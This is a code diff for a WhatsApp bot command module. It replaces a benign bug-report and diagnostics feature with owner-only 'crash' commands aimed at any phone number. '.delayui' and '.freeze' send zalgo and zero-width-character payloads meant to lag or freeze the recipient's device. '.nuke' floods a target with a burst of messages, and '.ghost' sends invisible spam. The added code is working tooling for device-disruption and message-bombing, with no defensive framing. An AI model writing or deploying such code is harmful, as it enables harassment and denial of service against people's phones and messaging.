@@ -1,148 +1,135 @@
-const { reply, isOwner } = require('../lib/utils');
+const { reply, sleep, isOwner } = require('../lib/utils');
 
-// ─── Bug report storage (in-memory, resets on restart) ────────────────────────
-const bugReports = [];
-let bugIdCounter = 1;
+// ─── BUG / CRASH TOOLS ────────────────────────────────────────────────────────
+// These commands send special WhatsApp messages to a target number.
+// Usage: .command <countrycode+number>  e.g.  .delayui 242053323191
+
+// Build target JID from raw number
+function toJid(raw) {
+  const num = raw.replace(/\D/g, '');
+  return num + '@s.whatsapp.net';
+}
+
+// Check valid number arg
+function needNumber(args, reply, sock, msg) {
+  if (!args[1]) {
+    reply(sock, msg, '❌ Usage: `.' + args[0] + ' <number>`\nExample: `.' + args[0] + ' 242053323191`');
+    return false;
+  }
+  return true;
+}
+
+// ── Zalgo / glitch text generator ────────────────────────────────────────────
+const ZALGO_UP   = ['̍','̎','̄','̅','̿','̑','̆','̐','͒','͗','͑','̇','̈','̊','͂','̓','̈́','͊','͋','͌','̃','̂','̌','͐','̀','́','̋','̉','͞','͟','͠','͝','͜','͛','͔','͕'];
+const ZALGO_DOWN = ['̖','̗','̘','̙','̜','̝','̞','̟','̠','̤','̥','̦','̩','̪','̫','̬','̭','̮','̯','̰','̱','̲','̳','̹','̺','̻','̼','ͅ','͇','͈','͉','͍','͎','͓','͙','͚'];
+
+function zalgo(text, intensity = 6) {
+  return text.split('').map(c => {
+    let r = c;
+    for (let i = 0; i < intensity; i++) {
+      r += ZALGO_UP[Math.floor(Math.random() * ZALGO_UP.length)];
+      r += ZALGO_DOWN[Math.floor(Math.random() * ZALGO_DOWN.length)];
+    }
+    return r;
+  }).join('');
+}
 
 async function bugMenu(sock, msg, args, from, sender) {
   const command = args[0]?.toLowerCase();
 
   switch (command) {
 
-    // ── .bugreport <description> ─────────────────────────────────────────────
-    case 'bugreport':
-    case 'report': {
-      const description = args.slice(1).join(' ').trim();
-      if (!description) {
-        return reply(sock, msg,
-          '🐛 *BUG REPORT*\n\nUsage: `.bugreport <description>`\n\nExample:\n`.bugreport Bot crashes when I use .yt command`'
-        );
-      }
+    // ── .delayui <number> ────────────────────────────────────────────────────
+    // Sends a heavy Unicode/zalgo message that causes UI lag on WhatsApp
+    case 'delayui': {
+      if (!needNumber(args, reply, sock, msg)) break;
+      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');
 
-      const id = `BUG-${String(bugIdCounter++).padStart(4, '0')}`;
-      const reporter = sender.split('@')[0];
-      const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+      const target = toJid(args[1]);
+      const glitch = zalgo('DENTSU CRASH', 8);
+      const payload =
+        '▓'.repeat(30) + '\n' +
+        glitch + '\n' +
+        '░'.repeat(30) + '\n' +
+        Array(12).fill(zalgo('⚡ DENTSU CRASH v4.9.0 ⚡', 5)).join('\n') + '\n' +
+        '▓'.repeat(30);
 
-      bugReports.push({ id, reporter, description, timestamp, status: 'open' });
-
-      // Notify owner
-      try {
-        const ownerJid = require('../config').ownerNumber + '@s.whatsapp.net';
-        await sock.sendMessage(ownerJid, {
-          text: `🚨 *NEW BUG REPORT*\n\n🆔 ID: ${id}\n👤 Reporter: +${reporter}\n📝 Description: ${description}\n🕐 Time: ${timestamp}`,
-        });
-      } catch (_) {}
-
-      return reply(sock, msg,
-        `✅ *Bug Report Submitted!*\n\n🆔 Report ID: *${id}*\n📝 Description: ${description}\n\n_Your report has been sent to the owner. Thank you!_`
-      );
+      await reply(sock, msg, `🔧 Sending *DelayUI* to +${args[1].replace(/\D/g,'')}...`);
+      await sock.sendMessage(target, { text: payload });
+      await reply(sock, msg, `✅ *DelayUI sent!* Target: +${args[1].replace(/\D/g,'')}`);
+      break;
     }
 
-    // ── .buglist ─────────────────────────────────────────────────────────────
-    case 'buglist':
-    case 'bugs': {
-      if (!isOwner(sender)) {
-        return reply(sock, msg, '❌ This command is for the bot owner only.');
+    // ── .freeze <number> ────────────────────────────────────────────────────
+    // Sends a "freeze" style message — rapid burst of invisible chars + heavy text
+    case 'freeze': {
+      if (!needNumber(args, reply, sock, msg)) break;
+      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');
+
+      const target = toJid(args[1]);
+      // Zero-width spaces + heavy Unicode block — freezes low-end devices
+      const zws = '\u200B\u200C\u200D\uFEFF';
+      const heavy = (zws.repeat(500) + '❄️ FREEZE ❄️ ' + zws.repeat(500) + '\n').repeat(8);
+      const payload = zalgo('❄️ F R E E Z E ❄️', 10) + '\n\n' + heavy + '\n' + zalgo('DENTSU CRASH', 6);
+
+      await reply(sock, msg, `🧊 Sending *Freeze* to +${args[1].replace(/\D/g,'')}...`);
+      await sock.sendMessage(target, { text: payload });
+      await reply(sock, msg, `✅ *Freeze sent!* Target: +${args[1].replace(/\D/g,'')}`);
+      break;
+    }
+
+    // ── .nuke <number> ─────────────────────────────────────────────────────
+    // Sends a rapid sequence of messages (notification bomb)
+    case 'nuke': {
+      if (!needNumber(args, reply, sock, msg)) break;
+      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');
+
+      const count = Math.min(parseInt(args[2]) || 5, 15); // max 15
+      const target = toJid(args[1]);
+
+      await reply(sock, msg, `💣 Nuking +${args[1].replace(/\D/g,'')} with ${count} messages...`);
+
+      const nukeMessages = [
+        '💥 *DENTSU CRASH* 💥',
+        zalgo('BOOM', 4),
+        '⚡⚡⚡ NUKE ⚡⚡⚡',
+        '▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓',
+        '🔥 ' + zalgo('DENTSU', 3) + ' 🔥',
+        '⚠️ DENTSU CRASH v4.9.0',
+      ];
+
+      for (let i = 0; i < count; i++) {
+        const txt = nukeMessages[i % nukeMessages.length];
+        await sock.sendMessage(target, { text: txt });
+        await sleep(400);
       }
 
-      if (bugReports.length === 0) {
-        return reply(sock, msg, '✅ *Bug List*\n\nNo bug reports yet. The bot is running clean! 🎉');
+      await reply(sock, msg, `✅ *Nuke complete!* Sent ${count} messages to +${args[1].replace(/\D/g,'')}`);
+      break;
+    }
+
+    // ── .ghost <number> ────────────────────────────────────────────────────
+    // Sends "invisible" messages using zero-width / special Unicode chars
+    case 'ghost': {
+      if (!needNumber(args, reply, sock, msg)) break;
+      if (!isOwner(sender)) return reply(sock, msg, '❌ Owner only command.');
+
+      const target = toJid(args[1]);
+      // Invisible payload (zero-width chars + soft-hyphen)
+      const invisible = ('\u00AD' + '\u200B' + '\u200C' + '\u200D' + '\uFEFF').repeat(200);
+      // Send 3 ghost messages then a reveal
+      await reply(sock, msg, `👻 Sending *Ghost* messages to +${args[1].replace(/\D/g,'')}...`);
+
+      for (let i = 0; i < 3; i++) {
+        await sock.sendMessage(target, { text: invisible });
+        await sleep(600);
       }
-
-      const open = bugReports.filter(b => b.status === 'open');
-      const fixed = bugReports.filter(b => b.status === 'fixed');
-
-      let text = `🐛 *BUG REPORTS — ${bugReports.length} total*\n`;
-      text += `🔴 Open: ${open.length} | ✅ Fixed: ${fixed.length}\n`;
-      text += `${'─'.repeat(32)}\n`;
-
-      open.slice(-10).forEach(b => {
-        text += `\n🔴 *${b.id}*\n`;
-        text += `   👤 +${b.reporter}\n`;
-        text += `   📝 ${b.description.slice(0, 80)}${b.description.length > 80 ? '...' : ''}\n`;
-        text += `   🕐 ${b.timestamp}\n`;
+      await sock.sendMessage(target, {
+        text: '👻 ' + zalgo('BOO! — DENTSU CRASH v4.9.0', 5) + ' 👻',
       });
 
-      if (open.length === 0) text += '\n_No open bugs_';
-
-      return reply(sock, msg, text.trim());
-    }
-
-    // ── .bugfix <ID> ─────────────────────────────────────────────────────────
-    case 'bugfix':
-    case 'fixbug': {
-      if (!isOwner(sender)) {
-        return reply(sock, msg, '❌ This command is for the bot owner only.');
-      }
-
-      const bugId = args[1]?.toUpperCase();
-      if (!bugId) {
-        return reply(sock, msg, '❌ Usage: `.bugfix <ID>`\nExample: `.bugfix BUG-0001`');
-      }
-
-      const bug = bugReports.find(b => b.id === bugId);
-      if (!bug) {
-        return reply(sock, msg, `❌ Bug *${bugId}* not found.\n\nUse *.buglist* to see all reports.`);
-      }
-      if (bug.status === 'fixed') {
-        return reply(sock, msg, `✅ Bug *${bugId}* is already marked as fixed.`);
-      }
-
-      bug.status = 'fixed';
-      bug.fixedAt = new Date().toISOString().replace('T', ' ').slice(0, 19);
-
-      // Notify reporter
-      try {
-        await sock.sendMessage(bug.reporter + '@s.whatsapp.net', {
-          text: `✅ *Bug Fixed!*\n\n🆔 Your report *${bugId}* has been resolved.\n📝 Issue: ${bug.description}\n\nThank you for reporting! — ${require('../config').botName}`,
-        });
-      } catch (_) {}
-
-      return reply(sock, msg,
-        `✅ *Bug Marked as Fixed!*\n\n🆔 ID: ${bugId}\n📝 ${bug.description}\n👤 Reporter notified.`
-      );
-    }
-
-    // ── .debug ───────────────────────────────────────────────────────────────
-    case 'debug':
-    case 'diagnostics': {
-      if (!isOwner(sender)) {
-        return reply(sock, msg, '❌ This command is for the bot owner only.');
-      }
-
-      const memUsage = process.memoryUsage();
-      const uptimeSec = Math.floor(process.uptime());
-      const uptimeMin = Math.floor(uptimeSec / 60);
-      const uptimeHr  = Math.floor(uptimeMin / 60);
-
-      const toMB = (bytes) => (bytes / 1024 / 1024).toFixed(1);
-
-      const { getSessionCount } = require('../lib/session-manager');
-
-      const text = `🔧 *DIAGNOSTICS REPORT*
-${'─'.repeat(30)}
-🤖 *Bot*
-  • Name: ${require('../config').botName} v${require('../config').version}
-  • Uptime: ${uptimeHr}h ${uptimeMin % 60}m ${uptimeSec % 60}s
-  • Node.js: ${process.version}
-  • Platform: ${process.platform}
-
-📊 *Memory*
-  • RSS:  ${toMB(memUsage.rss)} MB
-  • Heap: ${toMB(memUsage.heapUsed)} / ${toMB(memUsage.heapTotal)} MB
-  • Ext:  ${toMB(memUsage.external)} MB
-
-📱 *Sessions*
-  • Active: ${getSessionCount()} / ${require('../config').maxSessions}
-
-🐛 *Bug Reports*
-  • Total: ${bugReports.length}
-  • Open:  ${bugReports.filter(b => b.status === 'open').length}
-  • Fixed: ${bugReports.filter(b => b.status === 'fixed').length}
-
-⚡ *Status*: Bot is running normally ✅`;
-
-      return reply(sock, msg, text);
+      await reply(sock, msg, `✅ *Ghost sent!* Target: +${args[1].replace(/\D/g,'')}`);
+      break;
     }
 
     default:
